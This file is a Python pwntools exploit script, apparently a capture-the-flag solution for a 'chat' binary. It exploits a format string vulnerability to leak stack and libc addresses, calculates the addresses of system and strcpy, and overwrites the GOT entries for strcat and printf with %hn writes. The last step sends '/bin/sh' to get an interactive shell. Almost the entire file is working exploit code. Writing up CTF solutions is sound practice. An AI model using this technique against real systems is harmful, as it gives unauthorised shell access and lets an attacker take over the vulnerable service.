import sys
import struct
from pwn import *

NICK = 'XXXXX'

def overwrite(con, addr, content, str_offset):
    # the addresses usually do not differ in the first 2 bytes so we can keep them
    write1 = int(hex(content)[-4:], 16)
    write2 = int(hex(content)[-8:-4], 16)
    write3 = int(hex(content)[-12:-8], 16)
    w1_addr = addr
    w2_addr = addr+2
    w3_addr = addr+4

    # we have to perform the write in one operation
    # and we can only write a higher number with the second and third write
    ordered = sorted([(write1, w1_addr), (write2, w2_addr), (write3, w3_addr)])
    write1, w1_addr = ordered[0]
    write2, w2_addr = ordered[1]
    write3, w3_addr = ordered[2]

    log.info("keeping first 2 bytes")
    log.info("1) write %s to %s" % (hex(write1), hex(w1_addr)))
    log.info("2) write %s to %s" % (hex(write2), hex(w2_addr)))
    log.info("3) write %s to %s" % (hex(write3), hex(w3_addr)))

    # set up 1st address
    # note the generous padding: Just make sure we do not
    # overwrite our carefully planted addresses
    con.recvuntil(NICK + ': ')
    payload = struct.pack('<Q', w1_addr)
    con.send('\\' + 7*'X' + 48*'X' + 4*8*'X')
    con.sendline(payload)
    con.recvline()

    # set up 2nd address
    # note that there is another 8 byte padding in between the 2 addresses:
    # If we would not do this, the second write would overwrite
    # the first address because of the string termination char \x00
    con.recvuntil(NICK + ': ')
    payload = struct.pack('<Q', w2_addr)
    con.send('\\' + 7*'X' + 48*'X' + 2*8*'X')
    con.sendline(payload)
    con.recvline()

    # set up 3rd address
    con.recvuntil(NICK + ': ')
    payload = struct.pack('<Q', w3_addr)
    con.send('\\' + 7*'X' + 48*'X')
    con.sendline(payload)
    con.recvline()

    con.recvuntil(NICK + ': ')
    """
    # You can easily check that the addresses written are correct:
    con.sendline('\\%x %25$016lx %x %23$016lx %x %21$016lx')
    con.interactive()
    return
    """

    # the offset determines the number of bytes written before this string
    con.sendline('\\%{}x%25$hn%{}x%23$hn%{}x%21$hn'.format(write1 - str_offset, write2 - write1, write3 - write2))
    con.recvline()
    log.info("Overwrite finished")


def main():

    # con = remote('pwn.tyumenctf.ru', 2011)

    con = process(['./chat', 'A' * 24], env={'LD_PRELOAD': './libc-2.19.so'})
    log.info('PID %s' % util.proc.pidof(con)[0])
    # sys.stdin.read(1)

    con.recvuntil('token: ')
    con.sendline('ABCDEFGHI')  # send token
    # con.sendline('98lZqEyzy')

    con.recvuntil('nick: ')
    con.sendline(NICK)  # send NICKname

    con.recvuntil('>> ')
    con.sendline('1')

    # BEGIN EXPLOIT

    # guess current program pointer
    con.recvuntil(NICK + ': ')
    con.sendline('\\%9$016lx')

    ripx = con.recvline()[-17:-1].decode()
    ripx = int(ripx, 16)
    log.info('~RIP %s' % hex(ripx))

    r_addr = ripx + 0x3551  # adress at which printf is resolved
    log.info('resolve addr printf %s' % hex(r_addr))

    # put the resolve address on the stack
    # note that we add quite some padding in order
    # to not overwrite the address with our next call
    con.recvuntil(NICK + ': ')
    payload = struct.pack('<Q', r_addr)
    con.send('\\' + 7*'X' + 8*'X')
    con.sendline(payload)
    con.recvline()

    # read from the address we put on the stack before
    # this will yield the address of printf
    con.recvuntil(NICK + ': ')
    con.sendline('\\%16$s')
    # the first 33 bytes are trash, however we do not know
    # exacty the number of useful bytes
    bs = con.recvline()[33:-1]
    printf_addr = struct.unpack('<Q', bs.ljust(8, b'\x00'))[0]
    log.info('printf @ %s' % hex(printf_addr))

    # now that we know where printf is located
    # we can calculate the absolute position of '__libc_system'
    sys_addr = printf_addr - 0xf860
    log.info('__libc_system @ %s' % hex(sys_addr))

    scat_plt_addr = ripx + 0x35a1  # address at which strcat is resolved
    log.info('resolve addr strcat %s' % hex(scat_plt_addr))

    scpy_addr = printf_addr + 0xed920  # address of strcpy in libc
    log.info('strcpy @ %s' % hex(scpy_addr))

    # we now want to overwrite the address of strcat with the address of strcpy
    # in order to get rid of the 'cmd is invalid: ' part in log_err
    # note the offset of 17: the length of the string we want to get rid of
    log.info('Overwriting strcat ..')
    overwrite(con, scat_plt_addr, scpy_addr, 17)

    # now we can overwrite the address of printf
    # then we can cause the error message \/bin/sh which will spawn our shell
    # note the offset of 1, since we have to keep the first backslash \
    log.info('Overwriting printf ..')
    overwrite(con, r_addr, sys_addr, 1)

    # spawn a shell :)
    con.sendline('\\/bin/sh')
    con.interactive()


if __name__ == '__main__':
    main()
